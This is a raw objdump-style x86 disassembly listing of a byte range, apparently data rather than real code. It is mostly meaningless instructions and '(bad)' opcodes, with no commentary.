  4a0b1a:	and    al,0xbc
  4a0b1c:	and    eax,0x873c843
  4a0b21:	inc    eax
  4a0b22:	jecxz  0x4a0b4a
  4a0b24:	(bad)  
  4a0b25:	repnz sbb al,0x42
  4a0b28:	sub    ah,BYTE PTR [edi]
  4a0b2a:	dec    eax
  4a0b2b:	in     al,0x28
  4a0b2d:	xchg   DWORD PTR [eax+0x29cc10ca],edx
  4a0b33:	push   eax
  4a0b34:	in     eax,0xa4
  4a0b36:	xor    al,BYTE PTR [esp+edi*1+0xc2bd42a]
  4a0b3d:	and    edi,ecx
  4a0b3f:	and    DWORD PTR [eax-0x1a],ebx
  4a0b42:	sub    al,0xdc
  4a0b44:	enter  0x873,0xa9
  4a0b48:	sub    eax,0x1c2ee760
  4a0b4d:	inc    edx
  4a0b4e:	sub    al,BYTE PTR [ebx-0x1c]
  4a0b51:	das    
  4a0b52:	push   0x10ca90e8
  4a0b57:	repnz xor ah,ch
  4a0b5a:	xor    DWORD PTR [edx],esi
  4a0b5c:	test   BYTE PTR [edi+eax*4],bh
  4a0b5f:	jo     0x4a0b4a
  4a0b61:	xor    dh,ah
  4a0b63:	and    edi,ecx
  4a0b65:	and    DWORD PTR [ebx+esi*1+0x7334ea78],esp
  4a0b6c:	or     BYTE PTR [ecx-0x7fca03f4],ch
  4a0b72:	jmp    0x4a0bb6
  4a0b74:	sahf   
  4a0b75:	inc    ebx
  4a0b76:	enter  0x436,0xec
  4a0b7a:	aaa    
  4a0b7b:	out    0x10,eax
  4a0b7d:	push   edx
  4a0b7e:	sbb    DWORD PTR [eax-0x7b12f3c8],ecx
  4a0b84:	push   esp
  4a0b85:	xchg   BYTE PTR [eax-0x6ac56fc7],dl
  4a0b8b:	and    esp,esp
  4a0b8d:	cmp    DWORD PTR [esi+ebp*8],edx
  4a0b90:	cmp    ebx,DWORD PTR [eax+0xe79083c]
  4a0b96:	and    DWORD PTR [edi+ebp*8],ebx
  4a0b99:	cmp    eax,0x6548439e
  4a0b9e:	mov    al,ds:0x3ff0243e
  4a0ba3:	cwde   
  4a0ba4:	push   eax
  4a0ba5:	sbb    DWORD PTR [edx-0x58],eax
  4a0ba8:	inc    eax
  4a0ba9:	jmp    DWORD PTR [esi+0x8]
  4a0bac:	imul   eax,DWORD PTR [esi+0x8f141f1],0x42908669
  4a0bb6:	repnz inc ebx
  4a0bb8:	imul   eax,DWORD PTR [esi+0x44f26690],0x908645f3
  4a0bc2:	data16 or bl,dh
  4a0bc5:	inc    esi
  4a0bc6:	hlt    
  4a0bc7:	nop
  4a0bc8:	data16 or BYTE PTR [ecx+0x47],ch
  4a0bcc:	hlt    
  4a0bcd:	dec    eax
  4a0bce:	data16 or BYTE PTR [ecx-0x7a],ch
  4a0bd2:	cmc    
  4a0bd3:	dec    ecx
  4a0bd4:	cmc    
  4a0bd5:	or     BYTE PTR [ecx-0x7a],ch
  4a0bd8:	nop
  4a0bd9:	dec    edx
  4a0bda:	test   BYTE PTR [ebx-0xe],0x86
  4a0bde:	nop
  4a0bdf:	data16 test BYTE PTR [edi+esi*8+0x3a],0x4d
  4a0be5:	or     BYTE PTR [ecx-0x34],ch
  4a0be8:	adc    al,ah
  4a0bea:	dec    esi
  4a0beb:	sub    al,BYTE PTR [ebx-0x38]
  4a0bee:	jae    0x4a0c54
  4a0bf0:	clc    
  4a0bf1:	dec    edi
  4a0bf2:	call   0x1d3c1c47
  4a0bf7:	inc    edx
  4a0bf8:	ins    BYTE PTR es:[edi],dx
  4a0bf9:	stc    
  4a0bfa:	push   ecx
  4a0bfb:	cmp    al,0x87
  4a0bfd:	nop
  4a0bfe:	retf   0x52f0
  4a0c01:	je     0x4a0bfd
  4a0c03:	push   ebx
  4a0c04:	and    DWORD PTR [edx+esi*1+0x7954f884],esp
  4a0c0b:	push   cs
  4a0c0c:	and    edi,ecx
  4a0c0e:	jl     0x4a0c0b
  4a0c10:	push   ebp
  4a0c11:	add    ah,bh
  4a0c13:	push   esi
  4a0c14:	inc    ebx
  4a0c15:	dec    eax
  4a0c16:	or     BYTE PTR gs:[edi+edx*2+0x42195208],al
  4a0c1e:	sahf   
  4a0c1f:	std    
  4a0c20:	pop    eax
  4a0c21:	mov    WORD PTR [ecx-0x7a],ds
  4a0c24:	nop
  4a0c25:	out    0x10,eax
  4a0c27:	adc    dh,bh
  4a0c29:	pop    edx
  4a0c2a:	xchg   esp,eax
  4a0c2b:	in     al,0x39
  4a0c2d:	test   BYTE PTR [ebx+ebx*2+0x18],dl
  4a0c31:	call   FWORD PTR [edi+ecx*1+0x21]
  4a0c35:	xchg   ebp,eax
  4a0c36:	and    DWORD PTR [ebp+ebx*2-0x5bbeffe0],ebx
  4a0c3d:	xor    al,BYTE PTR [esp+esi*1+0xc5fa45e]
  4a0c44:	and    edi,ecx
  4a0c46:	and    DWORD PTR [eax],ebp
  4a0c48:	add    DWORD PTR [eax-0x54],esp
  4a0c4b:	enter  0x873,0xa9
  4a0c4f:	popa   
  4a0c50:	xor    BYTE PTR [edx],al
  4a0c52:	bound  ebx,QWORD PTR [edx+eax*2]
  4a0c55:	sub    al,BYTE PTR [ebx-0x4c]
  4a0c58:	arpl   WORD PTR [eax],di
  4a0c5a:	add    edx,DWORD PTR [eax+0x64f210ca]
  4a0c60:	mov    esp,0x3c843265
  4a0c65:	xchg   DWORD PTR [eax+0x4],eax
  4a0c68:	les    sp,DWORD PTR [ecx]
  4a0c6b:	iret   
  4a0c6c:	and    DWORD PTR [edi+eiz*2+0x73680548],esp
  4a0c73:	or     BYTE PTR [ecx+0x5069cc0c],ch
  4a0c79:	push   es
  4a0c7a:	inc    edx
  4a0c7b:	sub    al,BYTE PTR [ebx-0x38]
  4a0c7e:	push   0xffffffd4
  4a0c80:	imul   ecx,edx,0x10
  4a0c83:	repnz sbb al,0x58
  4a0c86:	pop    es
  4a0c87:	ins    BYTE PTR es:[edi],dx
  4a0c88:	fadd   QWORD PTR [esp+edi*1+0x606d9087]
  4a0c8f:	or     BYTE PTR [esi-0x31],ch
  4a0c92:	and    DWORD PTR [edx+esi*1+0x9686fe4],esp
  4a0c99:	jo     0x4a0ca3
  4a0c9b:	test   eax,0x71ec210c
  4a0ca0:	sub    al,BYTE PTR [ebx-0x38]
  4a0ca3:	jae    0x4a0d15
  4a0ca5:	or     dh,BYTE PTR [edx-0xc]
  4a0ca8:	jae    0x4a0cba
  4a0caa:	repnz sbb al,0x42
  4a0cad:	js     0x4a0cba
  4a0caf:	je     0x4a0ced
  4a0cb1:	xchg   DWORD PTR [eax-0x7f8a0336],edx
  4a0cb7:	or     al,0x76
  4a0cb9:	and    esp,esp
  4a0cbb:	cmp    DWORD PTR [esp+eax*1+0xe79770d],eax
  4a0cc2:	and    DWORD PTR [ebp+0xe0c7888],edx
  4a0cc8:	jns    0x4a0d0d
  4a0cca:	dec    eax
  4a0ccb:	or     BYTE PTR gs:[eax+0x1952147a],dl
  4a0cd2:	inc    edx
  4a0cd3:	sahf   
  4a0cd4:	(bad)  
  4a0cd6:	cwde   
  4a0cd7:	jl     0x4a0c5f
  4a0cd9:	nop
  4a0cda:	out    0x10,eax
  4a0cdc:	sbb    al,0x10
  4a0cde:	jge    0x4a0c80
  4a0ce0:	in     al,0x39
  4a0ce2:	test   BYTE PTR [esi+edi*2+0x24],dl
  4a0ce6:	adc    DWORD PTR [edi+0xe],edi
  4a0ce9:	and    DWORD PTR [ebp+0x2c80a821],edx
  4a0cef:	adc    cl,BYTE PTR [eax+0x65]
  4a0cf2:	or     BYTE PTR [ecx-0x7f],bh
  4a0cf5:	mov    al,0x82
  4a0cf7:	sbb    DWORD PTR [edx-0x62],eax
  4a0cfa:	inc    ebx
  4a0cfb:	xor    al,0x13
  4a0cfd:	cmp    DWORD PTR [eax+0x5210e790],0xffffff84
  4a0d04:	cmp    al,0x14
  4a0d06:	test   DWORD PTR [ecx],edi
  4a0d08:	test   BYTE PTR [esi+eax*4-0x40],dl
  4a0d0c:	xchg   BYTE PTR [ebp+edx*1+0x21],al
  4a0d10:	xchg   ebp,eax
  4a0d11:	and    esp,esp
  4a0d13:	xchg   eax,ecx
  4a0d15:	mov    BYTE PTR [ebp+0x8],ah
  4a0d18:	jns    0x4a0d28
  4a0d1a:	dec    esp
  4a0d1b:	push   ss
  4a0d1c:	mov    eax,edx
  4a0d1e:	inc    edx
  4a0d1f:	sahf   
  4a0d20:	inc    ebx
  4a0d21:	dec    eax
  4a0d22:	mov    dl,BYTE PTR [edi+edx*1-0x75]
  4a0d26:	out    0x10,eax
  4a0d28:	push   edx
  4a0d29:	sbb    eax,ebx
  4a0d2b:	mov    WORD PTR [eax+ebx*1-0x7c],ds
  4a0d2f:	push   esp
  4a0d30:	xchg   BYTE PTR [eax-0x6a711f73],dl
  4a0d36:	and    esp,esp
  4a0d38:	cmp    DWORD PTR [ecx+ebx*1-0x71],esp
  4a0d3c:	call   0xec315d1
  4a0d41:	and    DWORD PTR [edx+ebx*1-0x6f],ebp
  4a0d45:	sahf   
  4a0d46:	inc    ebx
  4a0d47:	dec    eax
  4a0d48:	gs lock xchg edx,eax
  4a0d4b:	je     0x4a0d68
  4a0d4d:	xchg   ebx,eax
  4a0d4e:	adc    BYTE PTR [edx+0x19],dl
  4a0d51:	inc    edx
  4a0d52:	clc    
  4a0d53:	xchg   esp,eax
  4a0d54:	cmp    al,0x87
  4a0d56:	nop
  4a0d57:	out    0x7c,eax
  4a0d59:	sbb    al,0x95
  4a0d5b:	add    BYTE PTR ds:0x32a42196,bl
  4a0d61:	test   BYTE PTR [edi+edx*4-0x30def357],al
  4a0d68:	or     BYTE PTR [esi],bl
  4a0d6a:	cwde   
  4a0d6b:	mov    WORD PTR [ecx+0x873c843],ds
  4a0d71:	adc    BYTE PTR [edi],bl
  4a0d73:	call   0x9b2a:0x421cf294
  4a0d7a:	sbb    BYTE PTR [eax],ah
  4a0d7c:	pushf  
  4a0d7d:	xchg   DWORD PTR [eax-0x6263ef36],edx
  4a0d83:	and    BYTE PTR [ecx],ah
  4a0d85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a0d86:	xor    al,BYTE PTR [esp+edi*1+0xc9fa49e]
  4a0d8d:	and    edi,ecx
  4a0d8f:	and    DWORD PTR [eax],ebp
  4a0d91:	and    ah,BYTE PTR [eax+0x873c8ac]
  4a0d97:	test   eax,0xa22330a1
  4a0d9c:	sbb    al,0x42
  4a0d9e:	sub    al,BYTE PTR [ebx-0x4c]
  4a0da1:	mov    ds:0xca902438,eax
  4a0da6:	adc    dl,dh
  4a0da8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a0da9:	mov    esp,0x3c8432a5
  4a0dae:	xchg   DWORD PTR [eax+0x25],eax
  4a0db1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a0db2:	les    esp,FWORD PTR [ecx]
  4a0db4:	iret   
  4a0db5:	and    DWORD PTR [edi+eiz*4+0x73a82648],esp
  4a0dbc:	or     BYTE PTR [ecx+0x50a9cc0c],ch
  4a0dc2:	daa    
  4a0dc3:	inc    edx
  4a0dc4:	sub    al,BYTE PTR [ebx-0x38]
  4a0dc7:	stos   BYTE PTR es:[edi],al
  4a0dc8:	aam    0xab
  4a0dca:	retf   0xf210
  4a0dcd:	sbb    al,0x58
  4a0dcf:	sub    BYTE PTR [esp+ebx*8-0x6f78c37c],ch
  4a0dd6:	lods   eax,DWORD PTR ds:[esi]
  4a0dd7:	pusha  
  4a0dd8:	sub    DWORD PTR [esi+0x32a421cf],ebp
  4a0dde:	in     al,0xaf
  4a0de0:	push   0xa908b02a
  4a0de5:	or     al,0x21
  4a0de7:	in     al,dx
  4a0de8:	mov    cl,0x2a
  4a0dea:	inc    ebx
  4a0deb:	enter  0x7073,0x2b
  4a0def:	mov    dl,0xf4
  4a0df1:	mov    bl,0x10
  4a0df3:	repnz sbb al,0x42
  4a0df6:	js     0x4a0e24
  4a0df8:	mov    ah,0x3c
  4a0dfa:	xchg   DWORD PTR [eax-0x7f4a0336],edx
  4a0e00:	sub    eax,0x39e421b6
  4a0e05:	test   BYTE PTR [esi+ebp*1],al
  4a0e08:	mov    bh,0x79
  4a0e0a:	push   cs
  4a0e0b:	and    DWORD PTR [ebp+0x2f0cb888],edx
  4a0e11:	mov    ecx,0x8654843
  4a0e16:	nop
  4a0e17:	mov    edx,0x42195214
  4a0e1c:	sahf   
  4a0e1d:	xor    BYTE PTR [ebx-0x6f794368],bh
  4a0e23:	out    0x10,eax
  4a0e25:	sbb    al,0x31
  4a0e27:	mov    ebp,0x8439e4a0
  4a0e2c:	push   esp
  4a0e2d:	mov    esi,0xebf3224
  4a0e32:	and    DWORD PTR [ebp+0x2cc0a821],edx
  4a0e38:	xor    ecx,DWORD PTR [eax+0x65]
  4a0e3b:	or     BYTE PTR [ecx-0x3f],bh
  4a0e3e:	mov    al,0xc2
  4a0e40:	sbb    DWORD PTR [edx-0x62],eax
  4a0e43:	inc    ebx
  4a0e44:	xor    al,0x34
  4a0e46:	ret    
  4a0e47:	mov    eax,0x5210e790
  4a0e4c:	les    edi,FWORD PTR [esi*1+0x548439c5]
  4a0e53:	xchg   al,al
  4a0e55:	mov    BYTE PTR [esi+esi*1+0x21],0x95
  4a0e5a:	and    esp,esp
  4a0e5c:	(bad)  
  4a0e5d:	enter  0x65c8,0x8
  4a0e61:	jns    0x4a0e71
  4a0e63:	dec    esp
  4a0e64:	aaa    
  4a0e65:	leave  
  4a0e66:	rol    BYTE PTR [edx-0x62],1
  4a0e69:	inc    ebx
  4a0e6a:	dec    eax
  4a0e6b:	retf   0x3854
  4a0e6e:	retf   
  4a0e6f:	out    0x10,eax
  4a0e71:	push   edx
  4a0e72:	sbb    eax,ebx
  4a0e74:	int3   
  4a0e75:	pop    esp
  4a0e76:	cmp    DWORD PTR [esp+edx*2-0x1f326f7a],eax
  4a0e7d:	into   
  4a0e7e:	xchg   ebp,eax
  4a0e7f:	and    esp,esp
  4a0e81:	cmp    DWORD PTR [edx+edi*1-0x31],esp
  4a0e85:	call   0xec3175a
  4a0e8a:	and    DWORD PTR [ebx+edi*1-0x2f],ebp
  4a0e8e:	sahf   
  4a0e8f:	inc    ebx
  4a0e90:	dec    eax
  4a0e91:	lock shl BYTE PTR gs:[esp+edi*1-0x2d],cl
  4a0e97:	adc    BYTE PTR [edx+0x19],dl
  4a0e9a:	inc    edx
  4a0e9b:	clc    
  4a0e9c:	aam    0x3c
  4a0e9e:	xchg   DWORD PTR [eax-0x2ac28319],edx
  4a0ea4:	add    BYTE PTR [esi],bh
  4a0ea6:	(bad)  
  4a0ea7:	and    DWORD PTR [edx+esi*1-0x56287b7c],esp
  4a0eae:	or     al,0x21
  4a0eb0:	iret   
  4a0eb1:	or     BYTE PTR [edi],bh
  4a0eb3:	fmul   DWORD PTR [ecx+ebx*8+0x873c843]
  4a0eba:	adc    BYTE PTR [eax-0x26],al
  4a0ebd:	xchg   esp,eax
  4a0ebe:	repnz sbb al,0x42
  4a0ec1:	sub    bl,bl
  4a0ec3:	sbb    BYTE PTR [ecx-0x24],al
  4a0ec6:	xchg   DWORD PTR [eax-0x2263ef36],edx
  4a0ecc:	and    BYTE PTR [edx-0x5c],al
  4a0ecf:	xor    al,BYTE PTR [esp+edi*1+0xcdfa4de]
  4a0ed6:	and    edi,ecx
  4a0ed8:	and    DWORD PTR [eax],ebp
  4a0eda:	inc    ebx
  4a0edb:	loopne 0x4a0e89
  4a0edd:	enter  0x873,0xa9
  4a0ee1:	loope  0x4a0f13
  4a0ee3:	inc    esp
  4a0ee4:	loop   0x4a0f02
  4a0ee6:	inc    edx
  4a0ee7:	sub    al,BYTE PTR [ebx-0x4c]
  4a0eea:	jecxz  0x4a0f24
  4a0eec:	inc    ebp
  4a0eed:	nop
  4a0eee:	retf   0xf210
  4a0ef1:	in     al,0xbc
  4a0ef3:	in     eax,0x32
  4a0ef5:	test   BYTE PTR [edi+eax*4],bh
  4a0ef8:	inc    eax
  4a0ef9:	inc    esi
  4a0efa:	out    0xc4,al
  4a0efc:	and    edi,ecx
  4a0efe:	and    DWORD PTR [edi+eiz*8+0x73e84748],esp
  4a0f05:	or     BYTE PTR [ecx+0x50e9cc0c],ch
  4a0f0b:	dec    eax
  4a0f0c:	inc    edx
  4a0f0d:	sub    al,BYTE PTR [ebx-0x38]
  4a0f10:	jmp    0x1cf2:0x10caebd4
  4a0f17:	pop    eax
  4a0f18:	dec    ecx
  4a0f19:	in     al,dx
  4a0f1a:	fadd   QWORD PTR [esp+edi*1+0x60ed9087]
  4a0f21:	dec    edx
  4a0f22:	out    dx,al
  4a0f23:	iret   
  4a0f24:	and    DWORD PTR [edx+esi*1+0x4b68efe4],esp
  4a0f2b:	lock or BYTE PTR [ecx-0xe13def4],ch
  4a0f32:	sub    al,BYTE PTR [ebx-0x38]
  4a0f35:	jae    0x4a0fa7
  4a0f37:	dec    esp
  4a0f38:	repnz hlt 
  4a0f3a:	repz adc dl,dh
  4a0f3d:	sbb    al,0x42
  4a0f3f:	js     0x4a0f8e
  4a0f41:	hlt    
  4a0f42:	cmp    al,0x87
  4a0f44:	nop
  4a0f45:	retf   0xf5fc
  4a0f48:	or     BYTE PTR [esi-0xa],0x21
  4a0f4c:	in     al,0x39
  4a0f4e:	test   BYTE PTR [edi+ecx*2],al
  4a0f51:	idiv   DWORD PTR [ecx+0xe]
  4a0f54:	and    DWORD PTR [ebp+0x500cf888],edx
  4a0f5a:	stc    
  4a0f5b:	inc    ebx
  4a0f5c:	dec    eax
  4a0f5d:	or     BYTE PTR gs:[eax+0x195214fa],dl
  4a0f64:	inc    edx
  4a0f65:	sahf   
  4a0f66:	push   ecx
  4a0f67:	sti    
  4a0f68:	cwde   
  4a0f69:	cld    
  4a0f6a:	xchg   BYTE PTR [eax+0x521c10e7],dl
  4a0f70:	std    
  4a0f71:	mov    al,ds:0x548439e4
  4a0f76:	(bad)  
  4a0f77:	and    al,0x53
  4a0f79:	jmp    FWORD PTR [edi]
  4a0f7b:	nop
  4a0f7c:	xchg   ebp,eax
  4a0f7d:	and    DWORD PTR [eax+0x542c0200],ebp
  4a0f83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a0f84:	xor    al,BYTE PTR [esp+edi*1+0xc02b001]
  4a0f8b:	and    edi,ecx
  4a0f8d:	and    DWORD PTR [edx*2+0x73c8b803],esi
  4a0f94:	or     BYTE PTR [ecx+0x5563c04],ch
  4a0f9a:	sbb    al,0x42
  4a0f9c:	sub    al,BYTE PTR [ebx-0x40]
  4a0f9f:	push   es
  4a0fa0:	inc    esp
  4a0fa1:	push   edi
  4a0fa2:	nop
  4a0fa3:	retf   0xf210
  4a0fa6:	pop    es
  4a0fa7:	enter  0x3208,0x84
  4a0fab:	cmp    al,0x87
  4a0fad:	dec    esp
  4a0fae:	pop    eax
  4a0faf:	or     eax,edx
  4a0fb1:	and    edi,ecx
  4a0fb3:	and    DWORD PTR [edx+ecx*1+0x730b5954],esp
  4a0fba:	or     BYTE PTR [ecx+0x5c0cd80c],ch
  4a0fc0:	pop    edx
  4a0fc1:	inc    edx
  4a0fc2:	sub    al,BYTE PTR [ebx-0x38]
  4a0fc5:	or     eax,0x10ca0ee0
  4a0fca:	repnz sbb al,0x64
  4a0fcd:	pop    ebx
  4a0fce:	psubsb mm0,QWORD PTR [esp+edi*1+0x6c109087]
  4a0fd6:	pop    esp
  4a0fd7:	adc    edi,ecx
  4a0fd9:	and    DWORD PTR [edx+esi*1+0x5d7412f0],esp
  4a0fe0:	adc    ecx,DWORD PTR [eax]
  4a0fe2:	test   eax,0x14f8210c
  4a0fe7:	sahf   
  4a0fe8:	inc    ebx
  4a0fe9:	enter  0x7c73,0x5e
  4a0fed:	adc    eax,0x10165f00
  4a0ff2:	push   edx
  4a0ff3:	sbb    DWORD PTR [edx-0x7c],eax
  4a0ff6:	pop    ss
  4a0ff7:	push   esp
  4a0ff8:	xchg   BYTE PTR [eax+0x186008e7],dl
  4a0ffe:	mov    WORD PTR [ecx],ds
  4a1000:	and    esp,esp
  4a1002:	cmp    DWORD PTR [eax+edx*1+0xe791a61],eax
  4a1009:	and    DWORD PTR [ebp+0x62181b94],edx
  4a100f:	sbb    al,0x43
  4a1011:	dec    eax
  4a1012:	or     BYTE PTR gs:[ebp+ebx*1+0x42195220],bl
  4a101a:	sahf   
  4a101b:	arpl   WORD PTR [esi],bx
  4a101d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a101e:	pop    ds
  4a101f:	xchg   BYTE PTR [eax+0x642810e7],dl
  4a1025:	and    BYTE PTR [esp+eiz*8+0x21548439],ch
  4a102c:	xor    BYTE PTR [ebp+0x22],ah
  4a102f:	push   cs
  4a1030:	and    DWORD PTR [ebp+0x3823b421],edx
  4a1036:	dec    ax
  4a1038:	or     BYTE PTR gs:[ecx+0x24],bh
  4a103c:	mov    esp,0x9e421925
  4a1041:	inc    ebx
  4a1042:	inc    eax
  4a1043:	les    edx,FWORD PTR es:[bx+si+0x10e7]
  4a1049:	push   edx
  4a104a:	daa    
  4a104b:	dec    eax
  4a104c:	push   0x54843928
  4a1051:	xchg   ah,cl
  4a1053:	sub    DWORD PTR [eax+0x69],edx
  4a1056:	and    DWORD PTR [ebp-0x2bd51bdf],edx
  4a105c:	sub    esp,DWORD PTR [ebp+0x8]
  4a105f:	jns    0x4a106f
  4a1061:	pop    eax
  4a1062:	push   0x2c
  4a1064:	fadd   QWORD PTR [edx-0x62]
  4a1067:	inc    ebx
  4a1068:	dec    eax
  4a1069:	sub    eax,0xe72e6b60
  4a106e:	adc    BYTE PTR [edx+0x19],dl
  4a1071:	in     al,0x2f
  4a1073:	push   0x8654846c
  4a1078:	nop
  4a1079:	xor    ah,ch
  4a107b:	xor    DWORD PTR [ebp+0x7039e421],edx
  4a1081:	ins    DWORD PTR es:[edi],dx
  4a1082:	xor    dh,ah
  4a1084:	xor    ecx,DWORD PTR [eax]
  4a1086:	jns    0x4a1096
  4a1088:	and    DWORD PTR [eax+0x6e],edi
  4a108b:	xor    al,0x9e
  4a108d:	inc    ebx
  4a108e:	dec    eax
  4a108f:	gs cld 
  4a1091:	xor    eax,0x10366f80
  4a1096:	repnz sbb al,0x42
  4a1099:	add    al,0x70
  4a109b:	aaa    
  4a109c:	cmp    al,0x87
  4a109e:	nop
  4a109f:	retf   0x3888
  4a10a2:	or     al,0x71
  4a10a4:	cmp    DWORD PTR [ecx],esp
  4a10a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a10a7:	xor    al,BYTE PTR [eax+edx*4+0x210ca93a]
  4a10ae:	iret   
  4a10af:	adc    al,0x72
  4a10b1:	cmp    ebx,DWORD PTR [eax+0x73c8433c]
  4a10b7:	or     BYTE PTR [ebx+esi*2],bl
  4a10ba:	cmp    eax,0x421cf2a0
  4a10bf:	sub    bh,BYTE PTR [esi]
  4a10c1:	and    al,0x74
  4a10c3:	aas    
  4a10c4:	les    eax,FWORD PTR [edx+ecx*8-0xbf57f0]
  4a10cb:	xor    al,0x43
  4a10cd:	dec    eax
  4a10ce:	xor    esi,DWORD PTR [ebp+0x41]
  4a10d1:	jne    0x4a1115
  4a10d3:	inc    ebx
  4a10d4:	dec    eax
  4a10d5:	xor    eax,DWORD PTR [esi+esi*2+0x33487643]
  4a10dc:	test   BYTE PTR [esp+eax*2],dh
  4a10df:	ja     0x4a1126
  4a10e1:	xor    eax,DWORD PTR [esp+esi*1+0x78467743]
  4a10e8:	test   BYTE PTR [ebx+eax*2],dh
  4a10eb:	dec    eax
  4a10ec:	inc    edi
  4a10ed:	js     0x4a1137
  4a10ef:	xor    al,0x43
  4a10f1:	dec    eax
  4a10f2:	xor    edi,DWORD PTR [ecx+0x49]
  4a10f5:	jns    0x4a1141
  4a10f7:	inc    ebx
  4a10f8:	dec    eax
  4a10f9:	xor    eax,DWORD PTR [edx+edi*2+0x33487a4b]
  4a1100:	test   BYTE PTR [esp+ecx*2],dh
  4a1103:	jnp    0x4a1152
  4a1105:	xor    eax,DWORD PTR [esp+esi*1+0x7c4e7b43]
  4a110c:	test   BYTE PTR [ebx+eax*2],dh
  4a110f:	dec    eax
  4a1110:	dec    edi
  4a1111:	jl     0x4a1163
  4a1113:	xor    al,0x43
  4a1115:	dec    eax
  4a1116:	xor    edi,DWORD PTR [ebp+0x51]
  4a1119:	jge    0x4a116d
  4a111b:	inc    ebx
  4a111c:	dec    eax
  4a111d:	xor    eax,DWORD PTR [esi+edi*2+0x33487e53]
  4a1124:	test   BYTE PTR [esp+edx*2],dh
  4a1127:	jg     0x4a117e
  4a1129:	xor    eax,DWORD PTR [esp+esi*1-0x7fa97fbd]
  4a1130:	test   BYTE PTR [ebx+eax*2],dh
  4a1133:	dec    eax
  4a1134:	push   edi
  4a1135:	sbb    DWORD PTR [eax+0x34],0x81334843
  4a113c:	pop    ecx
  4a113d:	sbb    BYTE PTR [edx+0x43],0x48
  4a1141:	xor    eax,DWORD PTR [edx+eax*4+0x3348835b]
  4a1148:	test   BYTE PTR [esp+ebx*2],dh
  4a114b:	sbb    DWORD PTR [ebp+0x33],0xffffff84
  4a114f:	xor    al,0x43
  4a1151:	test   BYTE PTR [esi-0x7c],bl
  4a1154:	test   BYTE PTR [ebx+eax*2],dh
  4a1157:	dec    eax
  4a1158:	pop    edi
  4a1159:	test   DWORD PTR [eax+0x34],esp
  4a115c:	inc    ebx
  4a115d:	dec    eax
  4a115e:	xor    eax,DWORD PTR [ebp+0x43628661]
  4a1164:	dec    eax
  4a1165:	xor    eax,DWORD PTR [esi+eax*4+0x33488763]
  4a116c:	test   BYTE PTR [esp+eiz*2],dh
  4a116f:	xchg   DWORD PTR [ebp+0x33],esp
  4a1172:	test   BYTE PTR [ebx+eax*2],dh
  4a1175:	mov    BYTE PTR [esi-0x78],ah
  4a1178:	test   BYTE PTR [ebx+eax*2],dh
  4a117b:	dec    eax
  4a117c:	mov    DWORD PTR [bx+si+0x34],ebp
  4a1180:	inc    ebx
  4a1181:	dec    eax
  4a1182:	xor    ecx,DWORD PTR [ecx+0x436a8a69]
  4a1188:	dec    eax
  4a1189:	xor    eax,DWORD PTR [edx+ecx*4+0x33488b6b]
  4a1190:	test   BYTE PTR [esp+ebp*2],dh
  4a1193:	mov    ebp,DWORD PTR [ebp+0x33]
  4a1196:	test   BYTE PTR [ebx+eax*2],dh
  4a1199:	mov    WORD PTR [esi-0x74],gs
  4a119c:	test   BYTE PTR [ebx+eax*2],dh
  4a119f:	dec    eax
  4a11a0:	outs   dx,DWORD PTR ds:[esi]
  4a11a1:	lea    esi,[eax+0x34]
  4a11a4:	inc    ebx
  4a11a5:	dec    eax
  4a11a6:	xor    ecx,DWORD PTR [ebp+0x43728e71]
  4a11ac:	dec    eax
  4a11ad:	xor    eax,DWORD PTR [esi+ecx*4+0x33488f73]
  4a11b4:	test   BYTE PTR [esp+esi*2],dh
  4a11b7:	(bad)  
  4a11b8:	jne    0x4a11ed
  4a11ba:	test   BYTE PTR [ebx+eax*2],dh
  4a11bd:	nop
  4a11be:	jbe    0x4a1151
  4a11c0:	test   BYTE PTR [ebx+eax*2],dh
  4a11c3:	dec    eax
  4a11c4:	ja     0x4a1157
  4a11c6:	js     0x4a11fc
  4a11c8:	inc    ebx
  4a11c9:	dec    eax
  4a11ca:	xor    edx,DWORD PTR [edx+0x437a9279]
  4a11d0:	dec    eax
  4a11d1:	xor    eax,DWORD PTR [ebx+edx*4+0x3348937b]
  4a11d8:	test   BYTE PTR [esp+edi*2],dh
  4a11db:	xchg   esp,eax
  4a11dc:	jge    0x4a1211
  4a11de:	test   BYTE PTR [ebx+eax*2],dh
  4a11e1:	xchg   esp,eax
  4a11e2:	jle    0x4a1179
  4a11e4:	test   BYTE PTR [ebx+eax*2],dh
  4a11e7:	dec    eax
  4a11e8:	jg     0x4a117f
  4a11ea:	xor    BYTE PTR [ebx+eax*2],0x48
  4a11ee:	xor    edx,DWORD PTR [esi+0x43829681]
  4a11f4:	dec    eax
  4a11f5:	xor    eax,DWORD PTR [edi+edx*4+0x33489783]
  4a11fc:	test   BYTE PTR [esp+eax*4],dh
  4a11ff:	cwde   
  4a1200:	test   DWORD PTR [ebx],esi
  4a1202:	test   BYTE PTR [ebx+eax*2],dh
  4a1205:	cwde   
  4a1206:	xchg   BYTE PTR [ecx+0x48433484],bl
  4a120c:	xchg   DWORD PTR [ecx+0x48433488],ebx
  4a1212:	xor    ebx,DWORD PTR [edx+0x438a9a89]
  4a1218:	dec    eax
  4a1219:	xor    eax,DWORD PTR [ebx+ebx*4+0x33489b8b]
  4a1220:	test   BYTE PTR [esp+ecx*4],dh
  4a1223:	pushf  
  4a1224:	lea    esi,[ebx]
  4a1226:	test   BYTE PTR [ebx+eax*2],dh
  4a1229:	pushf  
  4a122a:	mov    ds,WORD PTR [ebp+0x48433484]
  4a1230:	(bad)  
  4a1231:	popf   
  4a1232:	nop
  4a1233:	xor    al,0x43
  4a1235:	dec    eax
  4a1236:	xor    ebx,DWORD PTR [esi+0x43929e91]
  4a123c:	dec    eax
  4a123d:	xor    eax,DWORD PTR [edi+ebx*4+0x33489f93]
  4a1244:	test   BYTE PTR [esp+edx*4],dh
  4a1247:	mov    al,ds:0x34843395
  4a124c:	inc    ebx
  4a124d:	mov    eax,ds:0x3484a196
  4a1252:	inc    ebx
  4a1253:	dec    eax
  4a1254:	xchg   edi,eax
  4a1255:	mov    ds:0x48437998,al
  4a125a:	xor    esp,DWORD PTR [edx-0x65c55c67]
  4a1260:	test   BYTE PTR [esi+ebp*4+0x64],dl
  4a1264:	xchg   esp,eax
  4a1265:	fwait
  4a1266:	xchg   ebp,eax
  4a1267:	and    esp,esp
